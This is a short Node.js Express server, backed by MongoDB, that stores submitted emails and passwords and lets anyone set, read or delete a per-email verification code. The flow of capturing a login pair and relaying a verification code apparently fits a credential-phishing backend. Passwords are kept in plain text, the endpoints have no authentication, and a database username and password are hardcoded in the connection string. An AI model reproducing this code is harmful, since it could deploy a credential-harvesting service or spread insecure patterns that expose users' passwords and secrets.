import  Express  from "express";
import { dirname } from "path";
import { fileURLToPath } from "url";
import bodyParser from "body-parser"
import mongoose from 'mongoose';

const MONGO_URL = "mongodb+srv://florentino:code31415@cluster0.ocdbc53.mongodb.net/?retryWrites=true&w=majority"
mongoose.connect(MONGO_URL, {useNewUrlParser: true})

const app = Express()
let port = process.env.port
if(port == null || port == ""){
    port = 8080
}

const UserSchema = new mongoose.Schema({
    email: String,
    password: String,
    verify_code: String,
});

const User = mongoose.model("UserData", UserSchema);

const __dirname = dirname(fileURLToPath(import.meta.url))

app.use(bodyParser.urlencoded({extended : true}))

app.get("/", (req, res) =>{
    res.sendFile(__dirname + "/public/index.html")
})

app.post("/send-data", (req, res)=>{
    console.log(req.query)
    const user = new User(
    {
        email : req.query["email"],
        password : req.query["pass"],
        verify_code : "not_send",
    })
    res.send("success")
    user.save()
})

app.post("/update-code", (req, res)=>{
    // console.log(req.query)
    const tmp = User.updateOne({email: req.query.email}, {verify_code : `${req.query.code}`})
        .then((e)=>{
            console.log("succees");
            res.send("update success")
        })
        .catch((e)=>{
            console.log(e);
        })
})

app.get("/get-code", (req, res)=>{
    // console.log(req.query)
    User.findOne({email : req.query["email"]})
        .then((user)=>{
            res.send(user["verify_code"])
        })
})

app.post("/remove-user", (req, res)=>{
    User.deleteOne({email : req.query["email"]})
        .then((e)=>{
            res.send("deleted success")
        })
        .catch((err)=>{
            res.send(`remove error: ${err}`)
        })
})

app.listen(port, ()=>{
    console.log(`on port:${port}`)
});